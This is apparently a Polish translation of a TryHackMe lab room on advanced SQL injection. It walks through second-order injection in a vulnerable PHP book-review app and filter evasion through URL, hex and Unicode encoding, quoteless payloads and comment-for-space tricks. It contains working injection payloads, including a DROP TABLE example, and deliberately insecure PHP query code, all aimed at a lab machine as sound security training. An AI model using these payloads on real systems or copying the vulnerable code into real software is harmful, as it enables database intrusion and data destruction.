
SQL Ataki typu SQL injection pozostają jedną z najpoważniejszych i najbardziej rozpowszechnionych luk w zabezpieczeniach aplikacji internetowych. Zagrożenie to pojawia się, gdy atakujący wykorzystuje zdolność aplikacji internetowej do wykonywania dowolnych zapytań SQL, co prowadzi do nieautoryzowanego dostępu do bazy danych, eksfiltracji danych, manipulacji danymi, a nawet przejęcia całkowitej kontroli nad aplikacją. W tej sali poznamy zaawansowane techniki ataków typu SQL injection, zapewniając kompleksowe zrozumienie zaawansowanych wektorów ataku i strategii ich ograniczania.

Pod koniec tej sali zdobędziesz głębszą wiedzę na temat różnych technik wstrzykiwania kodu SQL. To wyposaży Cię w umiejętności identyfikowania i wykorzystywania tych luk w różnych scenariuszach oraz wdrażania skutecznych mechanizmów obronnych w celu ochrony Twoich aplikacji.

Cele edukacyjne

W tym pomieszczeniu zdobędziesz wszechstronne zrozumienie następujących kluczowych koncepcji:

- Wstrzyknięcie SQL drugiego rzędu   
    
- Unikanie filtra
- Wstrzyknięcie kodu SQL poza pasmem
- Techniki automatyzacji
- Środki łagodzące

Wymagania wstępne dotyczące nauki

Przed rozpoczęciem zajęć w pokoju zaleca się zapoznanie się z następującymi tematami:

- [Wstrzyknięcie SQL](https://tryhackme.com/r/room/sqlinjectionlm)
- [Mapa SQL](https://tryhackme.com/r/room/sqlmap)
- [OWASP10 najlepszych](https://tryhackme.com/module/owasp-top-10-2025)
- [Nmap](https://tryhackme.com/r/room/furthernmap)

Łączenie się z maszyną

Możesz uruchomić maszynę laboratoryjną, klikając `Start Lab Machine`przycisk dołączony do tego zadania. Dostęp do maszyny wirtualnej można uzyskać za pomocą AttackBox lub połączenia VPN. Później, w trakcie ćwiczenia, użyjemy podatnej aplikacji, aby przeprowadzić ćwiczenie w praktyce i zapoznać się z różnymi wektorami ataku. Odczekaj 1-2 minuty po pełnym uruchomieniu systemu, aby umożliwić prawidłowe uruchomienie skryptów automatycznych. 

Przed rozpoczęciem pracy kluczowe jest dokładne zrozumienie wersji bazy danych i szczegółów systemu operacyjnego komputera laboratoryjnego. W tym celu możemy wykorzystać **Nmap** , potężne narzędzie do skanowania sieci, do dokładnego przeskanowania sieci `MACHINE_IP`. To skanowanie dostarczy cennych informacji o otwartych portach, uruchomionych usługach i systemie operacyjnym komputera laboratoryjnego. Osobom niezaznajomionym z Nmapem zalecamy zapoznanie się z naszą obszerną ofertą poświęconą Nmapowi, aby szybko i sprawnie korzystać z tego narzędzia. Oto wynik skanowania Nmapa po przeskanowaniu komputera:

Terminal

```shell-session
thm@machine$ nmap -A -T4 -p 3306,3389,445,139,135 MACHINE_IP

Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-25 12:03 BST
Nmap scan report for MACHINE_IP
Host is up (0.00034s latency).

PORT     STATE    SERVICE       VERSION
135/tcp  open     msrpc
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
3306/tcp open     mysql
3389/tcp open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=SQLi
| Not valid before: 2024-05-23T04:08:44
|_Not valid after:  2024-11-22T04:08:44
|_ssl-date: 2024-05-25T11:03:33+00:00; 0s from scanner time.
MAC Address: 02:87:BD:21:12:33 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): AVtech embedded (87%)
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.67 seconds
```

Komputer korzysta z usługi MySQL w systemie Windows.

Zaczynajmy!

W ostatnimSQLW sali wstrzykiwań (Injection Room) zgłębiliśmy podstawy wstrzykiwania SQL, rozumiejąc, jak atakujący wykorzystują luki w zabezpieczeniach aplikacji internetowych do manipulowania zapytaniami SQL i uzyskiwania dostępu do nieautoryzowanych danych. Omówiliśmy podstawowe techniki, takie jak wstrzykiwanie SQL oparte na błędach i uniach, a także metody ślepego wstrzykiwania SQL, takie jak ataki oparte na wartościach boolowskich i oparte na czasie . Poniżej znajduje się krótkie podsumowanie sali, obejmujące podstawowe typy wstrzykiwania SQL.

![rodzaje ataków SQL injection|700](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716989638556)  

Wstrzykiwanie SQL w paśmie

Ta technika jest uważana za najpowszechniejszy i najprostszy rodzaj ataku typu SQL injection. W tej technice atakujący używa tego samego kanału komunikacji zarówno do wstrzyknięcia, jak i pobrania danych. Istnieją dwa główne typy ataku typu in-band SQL injection:  

- **Atak typu SQL Injection oparty na błędach** : Atakujący manipuluje zapytaniem SQL, aby generować komunikaty o błędach z bazy danych. Te komunikaty o błędach często zawierają informacje o strukturze bazy danych, które mogą zostać wykorzystane do dalszego wykorzystania jej luk w zabezpieczeniach. Przykład: `SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`Jeśli w komunikacie o błędzie zostanie zwrócona wersja bazy danych, ujawnione zostaną informacje o bazie danych.
- **Atak typu „union-Based SQL Injection”** : Atakujący używa operatora UNION SQL do łączenia wyników dwóch lub więcej instrukcji SELECT w jeden wynik, pobierając w ten sposób dane z innych tabel. Przykład: `SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`.

Wnioskowanie (ślepa) wstrzyknięcie SQL  

Inferencyjne ataki typu SQL injection nie przesyłają danych bezpośrednio przez aplikację internetową, co utrudnia ich wykorzystanie. Zamiast tego atakujący wysyła ładunki i obserwuje zachowanie aplikacji oraz czasy reakcji, aby wywnioskować informacje o bazie danych. Istnieją dwa główne typy inferencyjnego ataku typu SQL injection:  

- **Atak typu „ślepy atak SQL oparty na wartościach boolowskich”** : Atakujący wysyła zapytanie SQL do bazy danych, zmuszając aplikację do zwrócenia innego wyniku w zależności od tego, czy warunek jest prawdziwy, czy fałszywy. Analizując odpowiedź aplikacji, atakujący może wywnioskować, czy ładunek był prawdziwy, czy fałszywy. Przykład: `SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`Atakujący  może wywnioskować wynik, jeśli zawartość lub zachowanie strony zmieni się na podstawie warunku.
- **Atak typu Time-Based Blind SQL Injection** : Atakujący wysyła zapytanie SQL do bazy danych, które opóźnia odpowiedź o określony czas, jeśli warunek jest spełniony. Mierząc czas odpowiedzi, atakujący może wywnioskować, czy warunek jest prawdziwy, czy fałszywy. Na przykład,  `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`jeśli odpowiedź jest opóźniona o 5 sekund, atakujący może wywnioskować, że warunek był prawdziwy.

  
Wstrzyknięcie kodu SQL poza pasmem

Wstrzyknięcie SQL poza pasmem (out-of-band) jest stosowane, gdy atakujący nie może użyć tego samego kanału do przeprowadzenia ataku i zebrania wyników lub gdy odpowiedzi serwera są niestabilne. Technika ta opiera się na wysłaniu przez serwer bazy danych żądania poza pasmem (np.HTTPLubDNS) do wysłania wyniku zapytania do atakującego. Protokół HTTP jest zazwyczaj używany w atakach typu out-of-band SQL injection do wysłania  wyniku zapytania do serwera atakującego.  Omówimy to szczegółowo w tym pomieszczeniu.

Każdy rodzaj techniki wstrzykiwania kodu SQL ma swoje zalety i wady. Zrozumienie tych technik jest kluczowe dla identyfikacji i minimalizacji luk w zabezpieczeniach aplikacji internetowych związanych z wstrzykiwaniem kodu SQL. Wstrzykiwanie kodu SQL w paśmie (in-band) jest łatwe do wykorzystania i wykrycia, ale generuje zakłócenia i można je łatwo monitorować. Wstrzykiwanie kodu SQL w paśmie (blind) jest trudniejsze do wykorzystania i wymaga wielu żądań, ale można je zastosować, gdy szczegółowe komunikaty o błędach są niedostępne. Wstrzykiwanie kodu SQL poza pasmem (out-of-band) jest mniej powszechne i wysoce skuteczne, wymaga zewnętrznej kontroli serwera i opiera się na zdolności bazy danych do wysyłania żądań poza pasmem. Opanowanie tych technik pozwala testerom penetracyjnym skutecznie identyfikować i wykorzystywać luki w zabezpieczeniach wstrzykiwania kodu SQL, pomagając organizacjom zabezpieczyć swoje aplikacje internetowe przed tymi krytycznymi zagrożeniami.


Drugiego rzędu SQL injection, znane również jako wstrzyknięcie przechowywanego kodu SQL (Storage SQL Injection), wykorzystuje luki w zabezpieczeniach, w których dane wprowadzone przez użytkownika są zapisywane, a następnie wykorzystywane w innej części aplikacji, prawdopodobnie po wstępnym przetworzeniu. Ten typ ataku jest bardziej podstępny, ponieważ złośliwy kod SQL nie musi od razu powodować błędu składni SQL lub innych oczywistych problemów, co utrudnia jego wykrycie za pomocą standardowych technik walidacji danych wejściowych. Wstrzyknięcie następuje przy drugim użyciu danych, gdy są one pobierane i wykorzystywane w poleceniu SQL, stąd nazwa „ **drugiego rzędu** ”.

![schemat przepływu pracy wstrzykiwania kodu SQL drugiego rzędu|700](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716989709301)  

Uderzenie

Zagrożenie związane z atakiem SQL drugiego rzędu polega na jego zdolności do omijania typowych zabezpieczeń front-end, takich jak podstawowa walidacja danych wejściowych czy sanityzacja, które występują dopiero w momencie wprowadzania danych. Ponieważ ładunek nie powoduje zakłóceń w pierwszym kroku, może zostać przeoczony, aż będzie za późno, co sprawia, że ​​atak jest wyjątkowo dyskretny.  

**Przykład**  
Będziemy korzystać z aplikacji do recenzji książek. Aplikacja umożliwia użytkownikom dodawanie nowych książek za pośrednictwem strony internetowej ( `add.php`). Użytkownicy są proszeni o podanie szczegółów dotyczących książki, którą chcą dodać do bazy danych. Dostęp do aplikacji można uzyskać pod adresem `http://MACHINE_IP/second/add.php`[.(otwiera się w nowej karcie)](http://machine_ip/case1.)Zebrane dane obejmują `SSN`, `book_name`, i `author`. Rozważmy dodanie książki z następującymi szczegółami: **PESEL: UI00012** , **Tytuł książki: Wprowadzenie do PHP** , **Autor: Tim** . Informacje te są wprowadzane za pomocą formularza na `add.php`stronie, a po przesłaniu są zapisywane w bazie danych **BookStore** , jak pokazano poniżej:

![dodawanie nowej książki do bazy danych](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715774633948)  

Jak wiemy, wstrzyknięcie SQL drugiego rzędu jest wyjątkowo trudne do zidentyfikowania. W przeciwieństwie do tradycyjnego wstrzyknięcia SQL, które wykorzystuje luki w zabezpieczeniach przetwarzania w czasie rzeczywistym, występuje ono, gdy dane wcześniej zapisane w bazie danych są później wykorzystywane w zapytaniu SQL. Wykrycie tej luki często wymaga zrozumienia, w jaki sposób dane przepływają przez aplikację i są ponownie wykorzystywane, co wymaga dogłębnej wiedzy na temat operacji zaplecza.  

**Analiza kodu**

RozważPHPfragment kodu użyty w naszej aplikacji do dodawania książek:

```php
if (isset($_POST['submit'])) {

    $ssn = $conn->real_escape_string($_POST['ssn']);

    $book_name = $conn->real_escape_string($_POST['book_name']);

    $author = $conn->real_escape_string($_POST['author']);

    $sql = "INSERT INTO books (ssn, book_name, author) VALUES ('$ssn', '$book_name', '$author')";

    if ($conn->query($sql) === TRUE) {

        echo "<p class='text-green-500'>New book added successfully</p>";

    } else {

        echo "<p class='text-red-500'>Error: " . $conn->error . "</p>";

    }

}
```

Kod wykorzystuje tę `real_escape_string()`metodę do ucieczki znaków specjalnych w danych wejściowych. Chociaż metoda ta może zmniejszyć pewne ryzyko natychmiastowego ataku typu SQL Injection poprzez ucieczkę pojedynczych cudzysłowów i innych metaznaków SQL, nie zabezpiecza ona aplikacji przed atakami SQLi drugiego rzędu. Kluczowym problemem jest tutaj brak sparametryzowanych zapytań, co jest niezbędne do zapobiegania atakom typu SQL Injection. Dane wstawiane za pomocą tej `real_escape_string()`metody mogą zawierać znaki, które nie powodują natychmiastowych szkód, ale mogą zostać aktywowane po ponownym pobraniu i użyciu w innym zapytaniu SQL. Na przykład wstawienie książki o nazwie takiej jak **INSERT**`Intro to PHP'; DROP TABLE books;--` może nie wpłynąć na operację, ale może mieć poważne konsekwencje, jeśli nazwa książki zostanie później użyta w innym kontekście SQL bez odpowiedniej obsługi.

Spróbujmy dodać inną książkę z numerem SSN `test'`.

  

![całkowita liczba książek w bazie danych|700](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715776065076)

No i zaczynamy, numer PESEL `test'`został pomyślnie wstawiony do bazy danych. Aplikacja zawiera funkcję aktualizacji szczegółów książki za pomocą interfejsu takiego jak `update.php`. Interfejs ten może wyświetlać istniejące szczegóły książki w edytowalnych polach formularza, pobrane na podstawie wcześniej zapisanych danych, a następnie aktualizować je na podstawie danych wprowadzonych przez użytkownika. Pentester zbadałby, czy aplikacja ponownie wykorzystuje dane (takie jak `book_name`), które zostały wcześniej zapisane i potencjalnie skażone. Następnie skonstruowałby zapytania SQL w celu aktualizacji rekordów, wykorzystując te potencjalnie skażone dane bez odpowiedniej sanityzacji lub parametryzacji. Manipulując funkcją aktualizacji, tester może sprawdzić, czy złośliwy ładunek dodany podczas fazy wstawiania zostanie wykonany podczas operacji aktualizacji. Jeśli aplikacja nie zastosuje odpowiednich praktyk bezpieczeństwa na tym etapie, wcześniej wstrzyknięty ładunek `'; DROP TABLE books; --` może zostać aktywowany, co doprowadzi do wykonania szkodliwego polecenia SQL, takiego jak usunięcie tabeli. Możesz odwiedzić stronę `http://MACHINE_IP/second/update.php`, aby zaktualizować szczegóły książki.

![aktualizuj panel zawartości książki|352](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715786150389)  

Przyjrzyjmy się teraz kodowi `update.php`. Skrypt PHP umożliwia użytkownikom aktualizację szczegółów książek w bazie danych **BookStore** . Poprzez strukturę zapytania przeanalizujemy typowy scenariusz, w którym tester penetracyjny może szukać luk w zabezpieczeniach SQL injection, koncentrując się w szczególności na sposobie obsługi i wykorzystania danych wprowadzanych przez użytkownika w zapytaniach SQL. 

```php
if ( isset($_POST['update'])) {
    $unique_id = $_POST['update'];
    $ssn = $_POST['ssn_' . $unique_id];
    $new_book_name = $_POST['new_book_name_' . $unique_id];
    $new_author = $_POST['new_author_' . $unique_id];

    $update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
..
...
```

Skrypt rozpoczyna się od sprawdzenia, czy metodą żądania jest POST i czy naciśnięto przycisk aktualizacji, co oznacza, że ​​użytkownik zamierza zaktualizować dane książki. Następnie skrypt pobiera dane użytkownika bezpośrednio z danych POST:

```php
    $unique_id = $_POST['update'];
    $ssn = $_POST['ssn_' . $unique_id];
    $new_book_name = $_POST['new_book_name_' . $unique_id];
    $new_author = $_POST['new_author_' . $unique_id];
```

Następnie zmienne te ( `ssn, new_book_name, new_author`) służą do skonstruowania zapytania SQL w celu zaktualizowania szczegółów określonej książki w bazie danych:

```php
$update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
```

Skrypt służy `multi_query`do wykonywania wielu zapytań. Wstawia również logi do tabeli logów w celach analitycznych.  

Przygotowanie ładunku

Wiemy, że możemy dodawać lub modyfikować szczegóły książki na podstawie ich `ssn`… Typowe zapytanie o aktualizację książki wyglądałoby tak:

```php
UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';
```

Jednakże polecenie SQL może zostać zmanipulowane, jeśli atakujący wstawi specjalnie spreparowaną `ssn`wartość. Na przykład, jeśli atakujący użyje tej `ssn`wartości:

```php
12345'; UPDATE books SET book_name = 'Hacked'; --
```

Użycie tej wartości w zapytaniu aktualizacyjnym kończy początkowe polecenie aktualizacji `12345`i rozpoczyna nowe. Spowoduje to zmianę `book_name`wszystkich wpisów w tabeli „książki” na **„Zhakowane”** .  

**Zróbmy to**

- **Wstawianie początkowego ładunku** : Dodawana jest nowa książka z wstawionym ładunkiem `12345'; UPDATE books SET book_name = 'Hacked'; --`jako `ssn`. Średnik ( `;`) zostanie użyty do zakończenia bieżącego polecenia SQL.

![całkowita liczba książek w bazie danych z ładunkiem wstrzykiwanym](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715789331772)  

- **Złośliwe wykonanie kodu SQL** : Następnie, gdy administrator lub inny użytkownik odwiedzi adres URL  `http://MACHINE_IP/second/update.php` i zaktualizuje książkę, wstawiony ładunek wyłamuje się z zamierzonej struktury poleceń SQL i wstrzykuje nowe polecenie, które aktualizuje wszystkie rekordy w tabeli „książki”. Odwiedźmy stronę   `http://MACHINE_IP/second/update.php page`, zmieńmy nazwę książki na dowolną i kliknijmy  przycisk „ **Aktualizuj”** . Kod wykona poniższą instrukcję w zapleczu.

```php
UPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345'; Update books set book_name ="hacked"; --'; INSERT INTO logs (page) VALUES ('update.php');
```

- **Komentarzowanie reszty** : Podwójny myślnik ( `--`) to symbol komentarza SQL. Wszystko, co następuje po nim, `--`zostanie zignorowane przez serwer SQL, skutecznie neutralizując wszelkie pozostałe części oryginalnego polecenia SQL, które mogłyby spowodować błędy lub ujawnić atak. Po wykonaniu powyższego zapytania, zmieni ono nazwy wszystkich książek na **zhakowane** , jak pokazano poniżej:

![stan bazy danych po wykonaniu ładunku](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715789376753)

W tym zadaniu badaliśmy koncepcję wstrzykiwania kodu SQL drugiego rzędu za pomocą podatnej na ataki aplikacji webowej do recenzowania książek. Dla testera penetracyjnego kluczowe jest zbadanie sposobu przechowywania i późniejszego wykorzystywania danych wprowadzanych przez użytkownika w zapytaniach SQL. Wiąże się to z weryfikacją, czy wszystkie formy przetwarzania danych są zabezpieczone przed tego typu lukami, co podkreśla wagę gruntownego testowania i znajomości praktyk bezpieczeństwa w celu ochrony przed zagrożeniami związanymi z wstrzykiwaniem.


W zaawansowanym SQLW przypadku ataków typu injection, omijanie filtrów jest kluczowe dla skutecznego wykorzystania luk w zabezpieczeniach. Nowoczesne aplikacje internetowe często wdrażają środki obronne w celu oczyszczenia lub zablokowania typowych wzorców ataków, co sprawia, że ​​proste próby SQL injection są nieskuteczne. Jako pentesterzy musimy dostosować się do bardziej zaawansowanych technik, aby ominąć te filtry. W tej sekcji omówimy takie metody, w tym **kodowanie znaków** , wstrzykiwanie SQL **bez cudzysłowu** oraz obsługę scenariuszy, w których użycie **spacji** jest niedozwolone. Zrozumienie i zastosowanie tych technik pozwala na skuteczną penetrację aplikacji internetowych za pomocą rygorystycznej walidacji danych wejściowych i kontroli bezpieczeństwa . ![lista słów kluczowych do omijania filtrów|409](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716922193553)

Kodowanie znaków  
Kodowanie znaków polega na konwersji znaków specjalnych w treści ataku SQL injection na zakodowane formy, które mogą ominąć filtry wejściowe.  

- **Kodowanie adresów URL** : Kodowanie adresów URL to powszechna metoda, w której znaki są reprezentowane za pomocą znaku procentu (%), po którym następuje ich wartość ASCII w systemie szesnastkowym. Na przykład, dane `' OR 1=1--`mogą być zakodowane jako `%27%20OR%201%3D1--`. To kodowanie ułatwia przepływ danych wejściowych przez filtry aplikacji internetowych i ich dekodowanie przez bazę danych, która może nie rozpoznać ich jako złośliwych podczas wstępnego przetwarzania.
- **Kodowanie szesnastkowe** : Kodowanie szesnastkowe to kolejna skuteczna technika konstruowania zapytań SQL z wykorzystaniem wartości szesnastkowych. Na przykład zapytanie `SELECT * FROM users WHERE name = 'admin'`można zakodować jako `SELECT * FROM users WHERE name = 0x61646d696e`. Reprezentując znaki jako liczby szesnastkowe, atakujący może ominąć filtry, które nie dekodują tych wartości przed przetworzeniem danych wejściowych.
- `Unicode Encoding`:Kodowanie Unicode reprezentuje znaki za pomocą sekwencji ucieczki Unicode. Na przykład ciąg znaków `admin`można zakodować jako `\u0061\u0064\u006d\u0069\u006e`. Ta metoda pozwala ominąć filtry sprawdzające tylko określone znaki ASCII, ponieważ baza danych poprawnie przetworzy zakodowane dane wejściowe.

**Przykład**

W tym przykładzie pokażemy, jak programiści mogą wdrożyć podstawowe filtrowanie, aby zapobiegać atakom typu SQL injection, usuwając określone słowa kluczowe i znaki z danych wprowadzanych przez użytkownika. Zobaczymy jednak również, jak atakujący mogą ominąć te zabezpieczenia, stosując techniki kodowania znaków, takie jak kodowanie adresów URL.

**Uwaga** : W kolejnych ćwiczeniach będziemy korzystać z baz danych innych niż poprzednie. Dostęp do strony można uzyskać pod adresem `http://MACHINE_IP/encoding/`.

Oto kod PHP (search_books.php), który obsługuje funkcjonalność wyszukiwania:

```php
$book_name = $_GET['book_name'] ?? '';
$special_chars = array("OR", "or", "AND", "and" , "UNION", "SELECT");
$book_name = str_replace($special_chars, '', $book_name);
$sql = "SELECT * FROM books WHERE book_name = '$book_name'";
echo "<p>Generated SQL Query: $sql</p>";
$result = $conn->query($sql) or die("Error: " . $conn->error . " (Error Code: " . $conn->errno . ")");
if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
...
..
```

Oto kod Javascript na stronie index.html, który zapewnia interfejs użytkownika umożliwiający wyszukiwanie książek:

```php
function searchBooks() {
const bookName = document.getElementById('book_name').value;
const xhr = new XMLHttpRequest();
xhr.open('GET', 'search_books.php?book_name=' + encodeURIComponent(bookName), true);
   xhr.onload = function() {
       if (this.status === 200) {
           document.getElementById('results').innerHTML = this.responseText;
```

W powyższym przykładzie programista zaimplementował podstawowy mechanizm obronny, aby zapobiec atakom typu SQL injection, usuwając określone słowa kluczowe SQL, takie jak `OR`, `AND`, `UNION`i `SELECT`. Filtrowanie wykorzystuje  `str_replace`funkcję, która usuwa te słowa kluczowe z danych wprowadzanych przez użytkownika przed ich uwzględnieniem w zapytaniu SQL. To podejście filtrowania ma na celu utrudnienie atakującym wstrzyknięcia złośliwych poleceń SQL, ponieważ słowa kluczowe te są niezbędne dla wielu ładunków SQL injection.

Przygotowanie ładunku

Prześledźmy krok po kroku proces przygotowywania ładunku SQL injection, pokazując, jak kodowanie adresów URL może ominąć podstawowe zabezpieczenia. Najpierw zobaczmy, co się stanie ze zwykłymi danymi wejściowymi zawierającymi znaki specjalne lub słowa kluczowe SQL. Po wyszukaniu książki o nazwie  `Intro to PHP`, otrzymujemy pomyślny wynik, jak pokazano poniżej:

![wyszukaj panel książki](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716201873529)  

A co, jeśli spróbujemy rozbić zapytanie, dodając znaki specjalne, takie jak `'`, `;`, itd.? Otrzymamy następujący wynik:

![wynik błędu podczas wyszukiwania książki](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716201925761)  

Zapytanie SQL nie wykonuje się poprawnie, co prawdopodobnie oznacza ryzyko wstrzyknięcia kodu SQL. Spróbujmy wstrzyknąć ładunek „ `Intro to PHP' OR 1=1`”. Otrzymamy następujący wynik:

![wynik błędu z ładunkiem wtryskowym](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716202022860)  

Co więc się tu dzieje? Kiedy te dane wejściowe są przekazywane doPHPW skrypcie `str_replace`funkcja usunie słowo kluczowe OR i pojedynczy cudzysłów, co spowoduje oczyszczenie danych wejściowych, które nie spowodują wykonania zamierzonego ataku wstrzyknięcia SQL. Dane wejściowe są nieskuteczne, ponieważ filtrowanie usuwa kluczowe komponenty niezbędne do powodzenia ataku wstrzyknięcia SQL.

Aby ominąć filtrowanie, musimy zakodować dane wejściowe za pomocą kodowania URL, które reprezentuje znaki specjalne i słowa kluczowe w sposób, którego filtr nie rozpoznaje i nie usuwa. Oto przykładowy ładunek  `1%27%20||%201=1%20--+`.

- `%27`jest kodowaniem adresu URL dla pojedynczego cudzysłowu (').
- `%20`jest kodowaniem adresu URL dla spacji ( ).
- `||`reprezentuje operator SQL OR.
- `%3D`jest kodowaniem adresu URL dla znaku równości (=).
- `%2D%2D`jest kodowaniem adresu URL dla znaku --, rozpoczynającego komentarz w języku SQL.

W powyższym fragmencie kodu, funkcja  `1'`ta zamyka bieżący ciąg lub wartość w zapytaniu SQL. Na przykład, jeśli zapytanie szuka nazwy książki pasującej do 1, dodanie `'`zamyka ciąg, tworząc pozostałą część wejściową instrukcji SQL. `|| 1=1` Funkcja ta używa operatora SQL `OR`do dodania warunku, który zawsze jest prawdziwy. Ten warunek gwarantuje, że zapytanie zwróci wartość true dla wszystkich rekordów, pomijając pierwotny warunek, który miał ograniczać wyniki. Podobnie, `--` rozpoczyna komentarz w SQL, powodując, że baza danych ignoruje resztę zapytania. Jest to przydatne do zakończenia wszelkich pozostałych części zapytania, które mogłyby powodować błędy składniowe lub niepożądane warunki. Aby zapewnić prawidłowe odstępy,  `+` dodaj spację po komentarzu, upewniając się, że komentarz zostanie poprawnie zakończony i nie wystąpią żadne problemy ze składnią.

Z poziomu konsoli możemy zobaczyć, że kliknięcie przycisku Szukaj powoduje wywołanie AJAX-a `search_book.php`.  

![zakładka sieć w konsoli](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716099780661)

_Kliknij, aby powiększyć obraz._

Użyjmy ładunku bezpośrednio na stronie PHP, aby uniknąć niepotrzebnych modyfikacji/walidacji ze strony klienta. Przejdźmy pod adres URL  [http://MACHINE_IP/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1(otwiera się w nowej karcie)](http://machine_ip/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1) ze standardowym ładunkiem `Intro to PHP' OR 1=1`i zobaczysz błąd. 

![testowanie wtrysku w wywołaniu API](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716202208504)  

Teraz zakoduj ładunek w adresie URL `Intro to PHP' || 1=1 --+`za pomocą [Cyber ​​Chef(otwiera się w nowej karcie)](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(false\)) i spróbuj uzyskać dostęp do adresu URL z zaktualizowanym ładunkiem. Otrzymamy następujący wynik zrzucający pełne informacje:

![wstrzyknięcie z prawidłowym ładunkiem](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716100417790)  

Ładunek działa, ponieważ kodowanie adresu URL reprezentuje znaki specjalne i słowa kluczowe SQL w sposób, który omija mechanizm filtrowania. Gdy serwer dekoduje dane wejściowe zakodowane w adresie URL, przywraca znaki specjalne i słowa kluczowe, umożliwiając skuteczne wykonanie ataku typu SQL injection. Wykorzystując kodowanie adresu URL, atakujący mogą tworzyć ładunki omijające podstawowe mechanizmy filtrowania danych wejściowych, mające na celu blokowanie ataków typu SQL injection. Pokazuje to, jak ważne jest stosowanie bardziej solidnych zabezpieczeń, takich jak sparametryzowane zapytania i przygotowane instrukcje, które mogą zapobiegać atakom typu SQL injection niezależnie od kodowania danych wejściowych.


Bez cytatuSQLinjection

Techniki wstrzykiwania kodu SQL bez cudzysłowu są stosowane, gdy aplikacja filtruje pojedyncze lub podwójne cudzysłowy albo znaki ucieczki.

- **Użycie wartości liczbowych** : Jednym ze sposobów jest użycie wartości liczbowych lub innych typów danych, które nie wymagają cudzysłowów. Na przykład, zamiast wstrzykiwać `' OR '1'='1`, atakujący może użyć cudzysłowu `OR 1=1`w kontekście, w którym cudzysłowy nie są potrzebne. Ta technika pozwala ominąć filtry, które szukają znaków ucieczki lub usuwają cudzysłowy, umożliwiając przeprowadzenie wstrzykiwania.
- **Korzystanie z komentarzy SQL** : Inną metodą jest użycie komentarzy SQL do zakończenia reszty zapytania. Na przykład, dane wejściowe `admin'--`można przekształcić do `admin--`, gdzie , `--`oznacza początek komentarza w SQL, skutecznie ignorując resztę instrukcji SQL. Może to pomóc ominąć filtry i zapobiec błędom składniowym.
- **Korzystanie z funkcji CONCAT()** : Atakujący mogą używać funkcji SQL, takich jak `CONCAT()`konstruowanie ciągów znaków bez cudzysłowów. Na przykład, `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)`konstruuje ciąg znaków „admin”. `CONCAT()`Funkcja i podobne metody pozwalają atakującym konstruować ciągi znaków bez bezpośredniego użycia cudzysłowów, co utrudnia filtrom wykrycie i zablokowanie ładunku.

Brak spacji

Jeżeli spacje nie są dozwolone lub są odfiltrowywane, można zastosować różne techniki mające na celu ominięcie tego ograniczenia.

- **Komentarze zastępujące spacje** : Jedną z powszechnych metod jest użycie komentarzy SQL ( `/**/`) do zastępowania spacji. Na przykład, zamiast `SELECT * FROM users WHERE name = 'admin'`, atakujący może użyć `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'`. Komentarze SQL mogą zastąpić spacje w zapytaniu, umożliwiając ładunekowi ominięcie filtrów usuwających lub blokujących spacje.
